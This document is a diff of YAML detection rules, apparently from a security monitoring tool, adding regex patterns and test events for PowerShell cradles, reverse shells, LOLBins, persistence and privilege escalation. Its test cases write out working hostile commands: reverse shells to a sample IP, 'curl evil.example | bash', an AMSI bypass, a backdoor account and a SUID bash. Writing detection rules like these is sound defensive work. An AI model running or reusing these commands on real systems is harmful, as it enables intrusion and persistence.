-      - {field: command_line, regex: 'frombase64string.{0,200}(iex|invoke-expression)'}
+      - {field: command_line, regex: 'powershell(\.exe)?\s.{0,200}-(e|ec|en|enc|enco|encod|encode|encoded|encodedcommand)\s+[A-Za-z0-9+/=]{20,}'}
+      - {field: command_line, regex: 'frombase64string.{0,120}(iex|invoke-expression)'}
+      - {field: command_line, regex: '(iex|invoke-expression)\s{0,3}\(?\s{0,3}\(?\s{0,3}\[?(system\.)?(text\.)?encoding\]?::(utf8|unicode|ascii)\.getstring'}
+      - {field: command_line, regex: "(\\$env:comspec|\\[char\\]\\s?\\d{2,3}\\s?\\+\\s?\\[char\\]|-join\\s?\\(?'?[a-z0-9]{1,3}'?,'?[a-z0-9]{1,3}'?,)"}
+  tests:
+    - {event: {command_line: 'powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA'}, expect_match: true}
+    - {event: {command_line: 'powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA'}, expect_match: true}
+    - {event: {command_line: 'powershell.exe -File C:\scripts\backup.ps1'}, expect_match: false}
 
 - id: TB-EXEC-002
-  name: PowerShell download cradle
+  name: PowerShell download cradle or in-memory execution
   severity: high
   confidence: 80
-  tactics: [TA0002, TA0011]
-  techniques: [T1059.001, T1105]
+  techniques: [T1059.001, T1105, T1620]
   tags: [powershell, download-cradle]
   match:
-    all:
-      - {field: command_line, regex: '(iex|invoke-expression)'}
-      - {field: command_line, regex: '(downloadstring|downloadfile|invoke-webrequest|net\.webclient|start-bitstransfer)'}
+    any:
+      - all:
+          - {field: command_line, regex: '(iex|invoke-expression)'}
+          - {field: command_line, regex: '(downloadstring|downloadfile|downloaddata|invoke-webrequest|invoke-restmethod|\biwr\b|\birm\b|net\.webclient|start-bitstransfer|webrequest\]::create)'}
+      - {field: command_line, regex: '(\[reflection\.assembly\]::load|assembly\.load\(|invoke-reflectivepeinjection|invoke-shellcode|add-type\s.{0,40}(virtualalloc|createthread))'}
+      - {field: command_line, regex: 'amsiinitfailed|amsiutils|amsicontext|amsiscanbuffer'}
+  tests:
+    - {event: {command_line: "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://x.example/a.ps1')\""}, expect_match: true}
+    - {event: {command_line: 'powershell -nop -c "[Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true)"'}, expect_match: true}
+    - {event: {command_line: 'powershell Get-ChildItem C:\'}, expect_match: false}
 
 - id: TB-EXEC-003
   name: Reverse shell command
   severity: critical
   confidence: 90
-  tactics: [TA0002, TA0011]
   techniques: [T1059.004, T1095]
   tags: [reverse-shell]
   match:
     any:
-      - {field: command_line, regex: '/dev/tcp/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d+'}
-      - {field: command_line, regex: '\b(nc|ncat|netcat)\b.{0,200}\s-e\s'}
-      - {field: command_line, regex: 'bash\s+-i\s*>&'}
-      - {field: command_line, regex: 'python\d?\s+-c\s+.{0,200}socket.{0,200}(subprocess|pty\.spawn|dup2)'}
+      - {field: command_line, regex: '/dev/(tcp|udp)/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d+'}
+      - {field: command_line, regex: '\b(nc|ncat|netcat)(\.exe|\.traditional)?\s.{0,60}\s-[a-z]*e\s'}
+      - {field: command_line, regex: 'bash\s+-i\s{0,3}>&?\s{0,3}/dev/tcp'}
+      - {field: command_line, regex: '(python\d?|perl|ruby|php|lua)\s+-[a-z]\s.{0,200}(socket|fsockopen|TCPSocket|IO\.popen).{0,200}(/bin/(ba)?sh|cmd|exec|dup2|subprocess|spawn|pty)'}
+      - {field: command_line, regex: 'mkfifo\s+\S{1,40}.{0,60}(nc|ncat|netcat|/bin/sh|telnet)'}
+      - {field: command_line, regex: 'socat\s.{0,60}(exec|system):.{0,40}(/bin/(ba)?sh|cmd)'}
+      - {field: command_line, regex: 'openssl\s+s_client\s.{0,40}-connect.{0,80}(/bin/(ba)?sh|mkfifo)'}
+      - {field: command_line, regex: 'new-object\s+(system\.)?net\.sockets\.tcpclient.{0,200}(getstream|invoke-expression|iex|\.read\()'}
+  tests:
+    - {event: {command_line: "bash -c 'bash -i >& /dev/tcp/198.51.100.7/4444 0>&1'"}, expect_match: true}
+    - {event: {command_line: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"198.51.100.7\",4444));os.dup2(s.fileno(),0);subprocess.call([\"/bin/sh\",\"-i\"])'"}, expect_match: true}
+    - {event: {command_line: 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 198.51.100.7 4444 >/tmp/f'}, expect_match: true}
+    - {event: {command_line: 'nc -zv 10.0.0.5 22'}, expect_match: false}
 
 - id: TB-EXEC-004
-  name: Remote script piped into a shell
+  name: Remote script piped into a shell or decoded and executed
   severity: high
   confidence: 80
-  tactics: [TA0002]
-  techniques: [T1059.004, T1105]
+  techniques: [T1059.004, T1105, T1140]
   tags: [curl-bash, ingress-tool-transfer]
-  match: {field: command_line, regex: '\b(curl|wget)\b[^|;]*\|\s*(sudo\s+)?(ba|z|da)?sh\b'}
+  match:
+    any:
+      - {field: command_line, regex: '\b(curl|wget|fetch)\b[^|;]{0,200}\|\s{0,3}(sudo\s+)?(ba|z|da|k)?sh\b'}
+      - {field: command_line, regex: 'base64\s+(-d|--decode)[^|;]{0,80}\|\s{0,3}(sudo\s+)?(ba|z|da)?sh\b'}
+      - {field: command_line, regex: '(sh|bash)\s+-c\s+.{0,10}\$\((curl|wget)\s'}
+      - {field: command_line, regex: 'python\d?\s+-c\s.{0,60}(exec|eval)\s{0,3}\(.{0,40}(b64decode|base64|decompress)'}
+      - {field: command_line, regex: 'eval\s{0,3}\(?\s{0,3}"?\$\((curl|wget)'}
+  tests:
+    - {event: {command_line: 'curl -s http://evil.example/x.sh | bash'}, expect_match: true}
+    - {event: {command_line: 'echo ZWNobyBoaQ== | base64 -d | sh'}, expect_match: true}
+    - {event: {command_line: 'curl -o /tmp/page.html https://example.org'}, expect_match: false}
 
 - id: TB-EXEC-005
-  name: Living-off-the-land binary used to download or execute
+  name: Living-off-the-land binary used to download or execute content
   severity: high
   confidence: 75
-  tactics: [TA0005, TA0011]
   techniques: [T1218, T1105]
   tags: [lolbin]
   match:
     any:
-      - {field: command_line, regex: 'certutil(\.exe)?\s.{0,200}-(urlcache|decode)'}
-      - {field: command_line, regex: 'bitsadmin(\.exe)?\s.{0,200}/transfer'}
+      - {field: command_line, regex: 'certutil(\.exe)?\s.{0,60}-(urlcache|verifyctl).{0,60}(http|ftp)'}
+      - {field: command_line, regex: 'certutil(\.exe)?\s.{0,40}-decode(hex)?\s'}
+      - {field: command_line, regex: 'bitsadmin(\.exe)?\s.{0,60}/(transfer|addfile)'}
       - {field: command_line, regex: 'mshta(\.exe)?\s+(https?:|vbscript:|javascript:)'}
-      - {field: command_line, regex: 'regsvr32(\.exe)?\s.{0,200}/i:https?://'}
-      - {field: command_line, regex: 'rundll32(\.exe)?\s.{0,200}javascript:'}
+      - {field: command_line, regex: 'regsvr32(\.exe)?\s.{0,40}/i:(https?:|\\\\).{0,100}(scrobj|\.sct)'}
+      - {field: command_line, regex: 'rundll32(\.exe)?\s.{0,40}(javascript:|mshtml,runhtmlapplication|url\.dll,fileprotocolhandler\s+http)'}
+      - {field: command_line, regex: 'msiexec(\.exe)?\s.{0,40}/(q|i).{0,40}https?://'}
+      - {field: command_line, regex: '(installutil|regasm|regsvcs|odbcconf|msbuild|cmstp)(\.exe)?\s.{0,60}(/logfile=|/s\s|\.(xml|csproj|inf|dll)\b).{0,100}(temp|appdata|programdata|public|https?:)'}
+      - {field: command_line, regex: 'wmic(\.exe)?\s.{0,60}/format:\s?"?https?://'}
+      - {field: command_line, regex: 'forfiles(\.exe)?\s.{0,60}/c\s.{0,40}(cmd|powershell)'}
+  tests:
+    - {event: {command_line: 'certutil.exe -urlcache -split -f http://x.example/a.exe a.exe'}, expect_match: true}
+    - {event: {command_line: 'mshta.exe http://x.example/a.hta'}, expect_match: true}
+    - {event: {command_line: 'regsvr32 /s /n /u /i:http://x.example/a.sct scrobj.dll'}, expect_match: true}
+    - {event: {command_line: 'certutil -hashfile C:\f.iso sha256'}, expect_match: false}
 
-- id: TB-CRED-001
-  name: Credential dumping tool or LSASS access
-  severity: critical
-  confidence: 90
-  tactics: [TA0006]
-  techniques: [T1003, T1003.001]
-  tags: [mimikatz, lsass, credential-dumping]
-  match:
-    any:
-      - {field: text, regex: '\b(mimikatz|sekurlsa|lsadump|procdump.{0,200}lsass|comsvcs\.dll.{0,200}minidump)\b'}
-      - {field: text, regex: 'lsass(\.exe)?.{0,200}(dump|minidump|access)'}
-      - {field: process_name, regex: '^(mimikatz|pypykatz|lazagne)'}
-
-- id: TB-CRED-002
-  name: Sensitive credential file access (shadow / SAM / ntds)
-  severity: high
-  confidence: 80
-  tactics: [TA0006]
-  techniques: [T1003.008, T1003.002, T1003.003]
-  tags: [credential-access]
-  match:
-    any:
-      - {field: command_line, regex: '(cat|less|cp|tar)\s+.{0,200}/etc/shadow'}
-      - {field: command_line, regex: 'reg(\.exe)?\s+save\s+hklm\\(sam|security|system)'}
-      - {field: command_line, regex: 'ntdsutil.{0,200}(ifm|snapshot)|vssadmin.{0,200}ntds'}
-
-- id: TB-EVADE-001
-  name: Security log clearing or history tampering
+- id: TB-EXEC-006
+  name: Office application spawned a command interpreter or script host
   severity: high
   confidence: 85
-  tactics: [TA0005]
-  techniques: [T1070, T1070.001, T1070.003]
-  tags: [log-clearing, defense-evasion]
+  techniques: [T1204.002, T1059]
+  tags: [macro, phishing, process-ancestry]
   match:
-    any:
-      - {field: command_line, regex: 'wevtutil(\.exe)?\s+(cl|clear-log)'}
-      - {field: command_line, regex: 'clear-eventlog'}
-      - {field: command_line, regex: 'history\s+-c|unset\s+histfile|>\s*~?/?.{0,200}bash_history|rm\s+.{0,200}\.bash_history'}
-      - {field: event_type, regex: 'log_cleared|audit_log_cleared'}
+    all:
+      - {field: raw.parent_process, regex: '^(winword|excel|powerpnt|outlook|onenote|msaccess|mspub|visio)(\.exe)?$'}
+      - {field: process_name, regex: '^(cmd|powershell|pwsh|wscript|cscript|mshta|rundll32|regsvr32|certutil|bitsadmin|msbuild|wmic|curl|installutil)(\.exe)?$'}
+  tests:
+    - {event: {process_name: powershell.exe, raw_data: {parent_process: WINWORD.EXE}}, expect_match: true}
+    - {event: {process_name: splwow64.exe, raw_data: {parent_process: WINWORD.EXE}}, expect_match: false}
 
-- id: TB-EVADE-002
-  name: Security tooling disabled
-  severity: high
-  confidence: 80
-  tactics: [TA0005]
-  techniques: [T1562.001]
-  tags: [defense-evasion, tamper]
-  match:
-    any:
-      - {field: command_line, regex: 'set-mppreference\s+.{0,200}-disable(realtimemonitoring|behaviormonitoring)\s+\$?true'}
-      - {field: command_line, regex: 'netsh\s+advfirewall\s+set\s+\w+\s+state\s+off'}
-      - {field: command_line, regex: 'systemctl\s+(stop|disable)\s+(auditd|falco|ossec|wazuh|clamav|crowdstrike|falcon)'}
-      - {field: command_line, regex: 'sc(\.exe)?\s+(stop|config)\s+(windefend|sense|wscsvc)'}
-
-# --- Persistence / privilege escalation / impact ----------------------------
-- id: TB-PERSIST-001
-  name: New local account or privileged group change
-  severity: medium
-  confidence: 70
-  tactics: [TA0003, TA0004]
-  techniques: [T1136.001, T1098]
-  tags: [persistence, account-creation]
-  match:
-    any:
-      - {field: command_line, regex: '\buseradd\b|\badduser\b'}
-      - {field: command_line, regex: 'net(1)?(\.exe)?\s+user\s+\S+\s+\S+\s+/add'}
-      - {field: command_line, regex: 'net(1)?(\.exe)?\s+localgroup\s+administrators\s+\S+\s+/add'}
-      - {field: command_line, regex: 'usermod\s+.{0,200}-a?G\s*(sudo|wheel|admin)'}
-
-- id: TB-PERSIST-002
-  name: Scheduled task / cron persistence
+- id: TB-EXEC-007
+  name: Script host or interpreter executing from a user-writable staging location
   severity: medium
   confidence: 65
-  tactics: [TA0003, TA0002]
-  techniques: [T1053.003, T1053.005]
+  techniques: [T1059, T1204.002]
+  tags: [staging, scripting]
+  tuning: Software deployment tools run installers from temp; exclude by parent_process.
+  match:
+    any:
+      - {field: command_line, regex: '(wscript|cscript)(\.exe)?\s.{0,60}(\\appdata\\|\\temp\\|\\downloads\\|\\users\\public\\|%temp%|%appdata%).{0,80}\.(js|jse|vbs|vbe|wsf)'}
+      - {field: command_line, regex: '(/tmp/|/dev/shm/|/var/tmp/)\S{1,60}\s*(&|$)'}
+      - all:
+          - {field: raw.process_path, regex: '(/dev/shm/|^/tmp/|/var/tmp/|\\appdata\\local\\temp\\|\\users\\public\\|\\downloads\\)'}
+          - {field: event_type, regex: '^process\.(start|create)'}
+  tests:
+    - {event: {command_line: 'wscript.exe C:\Users\bob\AppData\Local\Temp\update.js'}, expect_match: true}
+    - {event: {event_type: process.start, raw_data: {process_path: '/dev/shm/.x/kworker'}}, expect_match: true}
+    - {event: {event_type: process.start, raw_data: {process_path: '/usr/bin/python3'}}, expect_match: false}
+
+- id: TB-EXEC-008
+  name: Remote execution tooling (PsExec / WMI / WinRM / schtasks remote)
+  severity: high
+  confidence: 75
+  techniques: [T1021.002, T1047, T1569.002, T1021.006]
+  tags: [lateral-movement, remote-execution]
+  match:
+    any:
+      - {field: command_line, regex: 'psexec(64)?(\.exe)?\s.{0,60}\\\\\S{1,40}'}
+      - {field: command_line, regex: 'wmic(\.exe)?\s+/node:.{0,80}(process\s+call\s+create|os\s+get)'}
+      - {field: command_line, regex: 'invoke-(command|wmimethod|cimmethod)\s.{0,80}-(computername|cn)\s'}
+      - {field: command_line, regex: 'sc(\.exe)?\s+\\\\\S{1,40}\s+(create|start|config)'}
+      - {field: command_line, regex: 'schtasks(\.exe)?\s.{0,40}/s\s+\S{1,40}\s.{0,60}/(create|run)'}
+      - {field: command_line, regex: '(enter-pssession|new-pssession)\s.{0,40}-computername'}
+      - {field: command_line, regex: '\b(wmiexec|smbexec|atexec|dcomexec|psexec)\.py\b'}
+  tests:
+    - {event: {command_line: 'PsExec64.exe \\10.0.0.7 -u admin -p x cmd.exe'}, expect_match: true}
+    - {event: {command_line: 'wmic /node:10.0.0.7 process call create "cmd /c calc"'}, expect_match: true}
+    - {event: {command_line: 'wmic os get caption'}, expect_match: false}
+
+- id: TB-EXEC-009
+  name: Container administration command executed inside a workload
+  severity: medium
+  confidence: 60
+  techniques: [T1609]
+  tags: [container, kubernetes]
+  match:
+    any:
+      - all:
+          - {field: event_type, regex: '^container\.k8s\.'}
+          - {field: raw.subresource, in: [exec, attach]}
+      - {field: command_line, regex: '(kubectl|oc)\s+(exec|attach|debug)\s'}
+      - {field: command_line, regex: 'docker\s+(exec|run).{0,40}(-it|--privileged|--pid=host|--net=host)'}
+  tests:
+    - {event: {event_type: container.k8s.audit, raw_data: {subresource: exec}}, expect_match: true}
+    - {event: {command_line: 'kubectl exec -it web-0 -- /bin/sh'}, expect_match: true}
+    - {event: {command_line: 'kubectl get pods'}, expect_match: false}
+
+# =============================================================== PERSISTENCE
+- id: TB-PERSIST-001
+  name: New local account or privileged group membership change
+  severity: medium
+  confidence: 70
+  techniques: [T1136.001, T1098]
+  tags: [persistence, account-creation]
+  tuning: Provisioning automation should be excluded by username or asset.
+  match:
+    any:
+      - {field: command_line, regex: '\b(useradd|adduser)\b\s.{0,60}'}
+      - {field: command_line, regex: 'net1?(\.exe)?\s+user\s+\S+\s+\S+\s+/add'}
+      - {field: command_line, regex: 'net1?(\.exe)?\s+localgroup\s+(administrators|remote desktop users)\s+\S+\s+/add'}
+      - {field: command_line, regex: 'usermod\s.{0,40}-a?G\s*\S{0,20}(sudo|wheel|admin|root)'}
+      - {field: command_line, regex: 'new-localuser|add-localgroupmember.{0,40}administrators'}
+      - {field: event_type, regex: '^iam\.(user_created|account_created|group_member_added)$'}
+  tests:
+    - {event: {command_line: 'useradd -m -s /bin/bash support2'}, expect_match: true}
+    - {event: {command_line: 'net user backdoor P@ssw0rd /add'}, expect_match: true}
+    - {event: {command_line: 'usermod -aG sudo backdoor'}, expect_match: true}
+    - {event: {command_line: 'id alice'}, expect_match: false}
+
+- id: TB-PERSIST-002
+  name: Scheduled task or cron persistence
+  severity: medium
+  confidence: 65
+  techniques: [T1053.005, T1053.003]
   tags: [persistence, scheduled-task]
   match:
     any:
-      - {field: command_line, regex: 'schtasks(\.exe)?\s+/create'}
-      - {field: command_line, regex: '(crontab\s+-|echo\s+.{0,200}>>\s*/(etc|var/spool)/cron)'}
+      - {field: command_line, regex: 'schtasks(\.exe)?\s.{0,40}/create'}
+      - {field: command_line, regex: '(crontab\s+-[a-z]{0,2}\s*$|crontab\s+\S+|echo\s.{0,200}>>?\s*/(etc/cron|var/spool/cron))'}
+      - {field: command_line, regex: '\(crontab\s+-l.{0,20};\s*echo'}
+      - {field: command_line, regex: '(@reboot|\*/\d{1,2}\s\*\s\*\s\*\s\*).{0,100}(curl|wget|nc|bash|python|/tmp/)'}
+      - {field: command_line, regex: 'register-scheduledtask|new-scheduledtask(action|trigger)'}
+      - {field: command_line, regex: '\bat(\.exe)?\s+\d{1,2}:\d{2}\s.{0,40}(cmd|powershell|\.exe)'}
+  tests:
+    - {event: {command_line: 'schtasks /create /tn Updater /tr C:\x.exe /sc onlogon'}, expect_match: true}
+    - {event: {command_line: '(crontab -l; echo "*/5 * * * * curl -s http://x.example/a|sh") | crontab -'}, expect_match: true}
+    - {event: {command_line: 'schtasks /query'}, expect_match: false}
 
 - id: TB-PERSIST-003
-  name: SSH authorized_keys modification
+  name: SSH authorized_keys or shell profile modification
   severity: medium
   confidence: 65
-  tactics: [TA0003]
-  techniques: [T1098.004]
+  techniques: [T1098.004, T1546.004]
   tags: [persistence, ssh]
-  match: {field: command_line, regex: '>>?\s*\S{0,20}\.ssh/authorized_keys'}
-
-- id: TB-IMPACT-001
-  name: Shadow copy / backup destruction
-  severity: critical
-  confidence: 90
-  tactics: [TA0040]
-  techniques: [T1490]
-  tags: [ransomware, inhibit-recovery]
   match:
     any:
-      - {field: command_line, regex: 'vssadmin(\.exe)?\s+delete\s+shadows'}
-      - {field: command_line, regex: 'wmic\s+shadowcopy\s+delete'}
-      - {field: command_line, regex: 'bcdedit.{0,200}recoveryenabled\s+no'}
-      - {field: command_line, regex: 'wbadmin\s+delete\s+(catalog|systemstatebackup)'}
+      - {field: command_line, regex: '(>>?|tee\s+-a|cat\s.{0,40}>>)\s{0,3}\S{0,80}\.ssh/authorized_keys'}
+      - {field: command_line, regex: '(echo|printf)\s.{0,200}>>?\s{0,3}\S{0,40}(\.bashrc|\.bash_profile|\.profile|\.zshrc|/etc/profile(\.d/\S{1,30})?|/etc/bash\.bashrc)'}
+      - all:
+          - {field: event_type, regex: '^file\.(create|write|modify)'}
+          - {field: raw.file_path, regex: '(\.ssh/authorized_keys|/etc/ld\.so\.preload)$'}
+  tests:
+    - {event: {command_line: 'echo "ssh-rsa AAAA... attacker" >> ~/.ssh/authorized_keys'}, expect_match: true}
+    - {event: {command_line: 'echo "alias ll=ls -l" >> ~/.bashrc'}, expect_match: true}
+    - {event: {command_line: 'cat ~/.ssh/known_hosts'}, expect_match: false}
 
-- id: TB-IMPACT-002
-  name: Ransomware indicators
-  severity: critical
-  confidence: 80
-  tactics: [TA0040]
-  techniques: [T1486]
-  tags: [ransomware]
-  match:
-    any:
-      - {field: text, regex: '\.(locked|crypt|encrypted|lockbit|ryuk|conti)\b'}
-      - {field: text, regex: 'your files (have been|are) encrypted|decrypt.{0,200}bitcoin|readme.{0,200}(restore|decrypt)'}
-      - {field: event_type, regex: 'ransom'}
-
-- id: TB-IMPACT-003
-  name: Cryptominer activity
+- id: TB-PERSIST-004
+  name: Service, startup item or registry autorun created
   severity: medium
-  confidence: 75
-  tactics: [TA0040]
-  techniques: [T1496]
-  tags: [cryptominer]
-  match: {field: text, regex: '\b(xmrig|minerd|stratum\+tcp|cpuminer|monero pool)\b'}
-
-# --- Lateral movement / exfiltration / network -------------------------------
-- id: TB-LAT-001
-  name: Inbound RDP / SMB / WinRM from an external address
-  severity: medium
-  confidence: 60
-  tactics: [TA0008, TA0001]
-  techniques: [T1021.001, T1021.002, T1021.006]
-  tags: [lateral-movement, exposed-service]
-  match:
-    all:
-      - {field: destination_port, in: [3389, 445, 5985, 5986]}
-      - {field: event_type, regex: 'firewall|network|connection|allow'}
-
-- id: TB-LAT-002
-  name: Remote execution tooling (PsExec / WMI / WinRM)
-  severity: high
-  confidence: 75
-  tactics: [TA0008]
-  techniques: [T1021.002, T1047, T1569.002]
-  tags: [lateral-movement]
-  match:
-    any:
-      - {field: command_line, regex: 'psexec(64)?(\.exe)?\s+\\\\'}
-      - {field: command_line, regex: 'wmic\s+/node:'}
-      - {field: command_line, regex: 'invoke-command\s+.{0,200}-computername'}
-
-- id: TB-EXFIL-001
-  name: Large outbound transfer
-  severity: medium
-  confidence: 55
-  tactics: [TA0010]
-  techniques: [T1048, T1567]
-  tags: [exfiltration]
-  match:
-    any:
-      - {field: raw.bytes_out, gte: 500000000}
-      - {field: raw.bytes_sent, gte: 500000000}
-      - {field: event_type, regex: 'exfil'}
-
-- id: TB-EXFIL-002
-  name: Archive staged for exfiltration
-  severity: medium
-  confidence: 55
-  tactics: [TA0009, TA0010]
-  techniques: [T1560.001, T1074]
-  tags: [staging, exfiltration]
-  match:
-    any:
-      - {field: command_line, regex: '(7z|rar|zip|tar)\S{0,20}\s+.{0,200}(a|-c[zj]f|-r)\s+.{0,200}\.(7z|rar|zip|tar(\.gz)?)\s+.{0,200}(\\users\\|/home/|/etc/|\.sql|\.db)'}
-
-- id: TB-NET-002
-  name: DNS tunneling indicator
-  severity: medium
-  confidence: 60
-  tactics: [TA0011, TA0010]
-  techniques: [T1071.004, T1048.003]
-  tags: [dns-tunnel]
-  match:
-    any:
-      - {field: raw.query_length, gte: 100}
-      - {field: event_type, regex: 'dns.{0,200}tunnel'}
-
-- id: TB-NET-003
-  name: Beaconing to known C2 framework path or user agent
-  severity: high
   confidence: 70
-  tactics: [TA0011]
-  techniques: [T1071.001, T1573]
-  tags: [c2, beaconing]
-  match: {field: text, regex: '\b(cobalt ?strike|meterpreter|sliver|havoc c2|empire stager|beacon\.(dll|exe))\b'}
-
-# --- Cloud (AWS CloudTrail and similar) --------------------------------------
-- id: TB-CLOUD-001
-  name: Storage bucket made publicly accessible
-  severity: high
-  confidence: 80
-  tactics: [TA0010, TA0009]
-  techniques: [T1530]
-  tags: [cloud, s3, public-exposure]
+  techniques: [T1543.003, T1543.002, T1547.001]
+  tags: [persistence, service, autorun]
   match:
     any:
-      - {field: event_type, regex: 'bucket.{0,200}public|public.{0,200}bucket|s3.{0,200}public'}
-      - {field: text, regex: '(putbucketacl|putbucketpolicy).{0,200}(allusers|authenticatedusers|"principal":\s*"\*")'}
+      - {field: command_line, regex: 'reg(\.exe)?\s+add\s.{0,60}\\(run|runonce|runservices)(ex)?\s.{0,40}/v'}
+      - {field: command_line, regex: 'sc(\.exe)?\s+(\\\\\S{1,40}\s+)?create\s.{0,60}binpath'}
+      - {field: command_line, regex: '(new-service|set-service).{0,60}-binarypathname'}
+      - {field: command_line, regex: 'systemctl\s+(enable|daemon-reload).{0,60}(/tmp/|/dev/shm/|\.\./)|(echo|cat|tee)\s.{0,300}>\s?/etc/systemd/system/\S{1,40}\.service'}
+      - {field: event_type, regex: '^system\.(service_installed|autorun_created)'}
+      - {field: command_line, regex: '(copy|move|xcopy)\s.{0,80}\\start menu\\programs\\startup\\'}
+  tests:
+    - {event: {command_line: 'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\x.exe'}, expect_match: true}
+    - {event: {command_line: 'sc create evil binPath= C:\x.exe start= auto'}, expect_match: true}
+    - {event: {event_type: system.service_installed}, expect_match: true}
+    - {event: {command_line: 'sc query spooler'}, expect_match: false}
 
-- id: TB-CLOUD-002
-  name: Audit logging disabled or tampered
+- id: TB-PERSIST-005
+  name: WMI event subscription persistence
+  severity: high
+  confidence: 80
+  techniques: [T1546.003]
+  tags: [persistence, wmi]
+  match: {field: text, regex: '(__eventfilter|commandlineeventconsumer|activescripteventconsumer|__filtertoconsumerbinding|set-wmiinstance.{0,60}(eventfilter|consumer))'}
+  tests:
+    - {event: {command_line: 'Set-WmiInstance -Namespace root\subscription -Class __EventFilter'}, expect_match: true}
+    - {event: {command_line: 'Get-WmiObject Win32_OperatingSystem'}, expect_match: false}
+
+- id: TB-PERSIST-006
+  name: Linux dynamic-linker preload hijack
+  severity: high
+  confidence: 75
+  techniques: [T1574.006]
+  tags: [persistence, ld-preload, rootkit]
+  match:
+    any:
+      - {field: command_line, regex: '(echo|tee|cat).{0,80}/etc/ld\.so\.preload'}
+      - {field: command_line, regex: 'LD_PRELOAD=\S{1,80}\.so\s+\S'}
+  tests:
+    - {event: {command_line: 'echo /tmp/.libx.so > /etc/ld.so.preload'}, expect_match: true}
+    - {event: {command_line: 'ldd /bin/ls'}, expect_match: false}
+
+# =============================================================== PRIVILEGE ESCALATION
+- id: TB-PRIV-001
+  name: Setuid/setgid bit set or SUID enumeration
+  severity: medium
+  confidence: 65
+  techniques: [T1548.001]
+  tags: [privilege-escalation, suid]
+  match:
+    any:
+      - {field: command_line, regex: 'chmod\s+(u\+s|\+s|[0-7]?[4267][0-7]{3}|a\+s|g\+s)\s+\S{1,80}(bash|sh|find|vim|nmap|python\d?|perl|cp|env|awk|less|more|tar|nano)\b'}
+      - {field: command_line, regex: 'find\s+/\s.{0,40}-perm\s+-?(4000|u=s|2000|6000)'}
+  tests:
+    - {event: {command_line: 'chmod u+s /bin/bash'}, expect_match: true}
+    - {event: {command_line: 'chmod 4755 /tmp/rootsh'}, expect_match: true}
+    - {event: {command_line: 'chmod 644 /srv/notes.txt'}, expect_match: false}
+    - {event: {command_line: 'find / -perm -4000 -type f 2>/dev/null'}, expect_match: true}
+
+- id: TB-PRIV-002
+  name: Privilege-escalation exploit or enumeration tooling
+  severity: high
+  confidence: 80
+  techniques: [T1068, T1548]
+  tags: [privilege-escalation, tooling]
+  match:
+    any:
+      - {field: command_line, regex: '\b(printspoofer|juicypotato|roguepotato|godpotato|sweetpotato|hotpotato|badpotato|winpeas|linpeas|linenum|linux-exploit-suggester|pspy(32|64)?|sudo_killer|dirtycow|dirtypipe|pwnkit|baron-samedit)\w{0,4}\b'}
+      - {field: command_line, regex: 'pkexec\s.{0,40}(GCONV_PATH|/tmp/)|GCONV_PATH=.{0,40}pkexec'}
+      - {field: process_name, regex: '^(printspoofer|juicypotato|godpotato|winpeas|linpeas|roguepotato)(x64|x86|any)?(\.exe)?$'}
+  tests:
+    - {event: {command_line: 'PrintSpoofer64.exe -i -c cmd'}, expect_match: true}
+    - {event: {command_line: './linpeas.sh -a'}, expect_match: true}
+    - {event: {command_line: 'systemctl status ssh'}, expect_match: false}
+
+- id: TB-PRIV-003
+  name: UAC bypass or auto-elevating binary abuse
+  severity: high
+  confidence: 80
+  techniques: [T1548.002]
+  tags: [privilege-escalation, uac]
+  match:
+    any:
+      - {field: command_line, regex: 'reg(\.exe)?\s+add\s.{0,60}(ms-settings\\shell\\open\\command|mscfile\\shell\\open\\command|exefile\\shell\\open\\command|\\software\\classes\\\S{1,20}\\shell\\open\\command)'}
+      - {field: raw.parent_process, regex: '^(fodhelper|eventvwr|computerdefaults|sdclt|slui|wsreset|cmstp)(\.exe)?$'}
+  tests:
+    - {event: {command_line: 'reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d cmd.exe /f'}, expect_match: true}
+    - {event: {command_line: 'reg add HKCU\Software\Vendor\App /v Theme /d dark'}, expect_match: false}
+
+- id: TB-PRIV-004
+  name: Privileged or host-escaping container launched
+  severity: high
+  confidence: 80
+  techniques: [T1611, T1610]
+  tags: [container, privilege-escalation]
+  match:
+    any:
+      - {field: command_line, regex: 'docker\s+run\s.{0,120}(--privileged|--pid=host|-v\s+/:/|-v\s+/var/run/docker\.sock|--cap-add[= ](sys_admin|all)|--security-opt\s+(apparmor|seccomp)=unconfined)'}
+      - {field: command_line, regex: '\b(nsenter\s.{0,30}(-t|--target)\s?1\b|chroot\s+/host|mount\s.{0,20}/dev/(sd|nvme|xvd)\w{1,8}\s+/mnt|release_agent)'}
+      - all:
+          - {field: event_type, regex: '^container\.'}
+          - {field: text, regex: '(privileged:\s*true|hostpid:\s*true|hostnetwork:\s*true|hostpath|allowprivilegeescalation:\s*true|launch privileged container|mount launched in privileged)'}
+  tests:
+    - {event: {command_line: 'docker run -it --privileged -v /:/host alpine chroot /host'}, expect_match: true}
+    - {event: {event_type: container.k8s.audit, raw_data: {object: 'pod spec privileged: true hostPID: true'}}, expect_match: true}
+    - {event: {command_line: 'docker run -d nginx'}, expect_match: false}
+
+- id: TB-PRIV-005
+  name: Cluster-admin or administrator privilege granted
+  severity: high
+  confidence: 75
+  techniques: [T1098, T1098.003]
+  tags: [privilege-escalation, iam, kubernetes]
+  tuning: Expected during onboarding of platform admins; review the actor.
+  match:
+    any:
+      - {field: command_line, regex: 'kubectl\s+create\s+(cluster)?rolebinding.{0,120}(cluster-admin|--clusterrole=admin)'}
+      - all:
+          - {field: event_type, regex: '^container\.k8s\.'}
+          - {field: raw.resource, in: [clusterrolebindings, rolebindings]}
+          - {field: raw.verb, in: [create, update, patch]}
+          - {field: text, regex: 'cluster-admin'}
